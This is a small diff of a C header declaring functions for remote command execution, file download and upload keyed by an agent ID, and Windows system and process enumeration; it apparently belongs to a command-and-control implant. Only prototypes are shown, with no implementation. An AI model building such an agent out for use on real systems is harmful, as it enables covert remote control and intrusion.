@@ -6,6 +6,8 @@
 void execute_command(const char *command, char *output, size_t output_size, const char *agent_id);
 void download_file(const char *remote_path, const char *agent_id, char *output, size_t output_size);
 void upload_file(const char *remote_path, const char *agent_id, char *output, size_t output_size);
-void enum_sys();
+void enumerate_system(char *output, size_t output_size);
+void print_process_name_and_id(const DWORD pid, char *output, size_t output_size);
+void print_process_name(char *output, size_t output_size);
 
 #endif
